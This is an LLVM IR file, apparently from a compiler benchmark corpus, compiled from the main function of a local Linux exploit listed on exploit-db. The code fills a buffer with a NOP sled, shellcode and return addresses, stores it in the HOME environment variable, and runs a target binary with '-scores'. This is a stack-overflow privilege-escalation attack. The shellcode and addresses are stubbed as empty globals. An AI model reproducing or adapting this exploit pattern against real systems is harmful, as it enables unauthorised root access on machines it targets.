; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_71.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_71.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@RET = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@BIN = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"-scores\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = load i32, i32* @RET, align 4
  store i32 %4, i32* %1, align 4
  %5 = load i32, i32* @SIZE, align 4
  %6 = zext i32 %5 to i64
  %7 = call i8* @llvm.stacksave()
  store i8* %7, i8** %2, align 8
  %8 = alloca i8, i64 %6, align 16
  store i64 %6, i64* %3, align 8
  %9 = load i32, i32* %1, align 4
  %10 = load i32, i32* @SIZE, align 4
  %11 = sub nsw i32 %10, 1
  %12 = call i32 @memret(i8* %8, i32 %9, i32 %11, i32 0)
  %13 = load i32, i32* @NOP, align 4
  %14 = call i32 @memset(i8* %8, i32 %13, i32 33)
  %15 = getelementptr inbounds i8, i8* %8, i64 33
  %16 = load i32, i32* @shellcode, align 4
  %17 = load i32, i32* @shellcode, align 4
  %18 = call i32 @strlen(i32 %17)
  %19 = call i32 @memcpy(i8* %15, i32 %16, i32 %18)
  %20 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* %8, i32 1)
  %21 = call i32 (...) @banner()
  %22 = load i32, i32* @BIN, align 4
  %23 = load i32, i32* @BIN, align 4
  %24 = call i32 @execl(i32 %22, i32 %23, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i32 0)
  %25 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %25)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memret(i8*, i32, i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @banner(...) #2

declare dso_local i32 @execl(i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
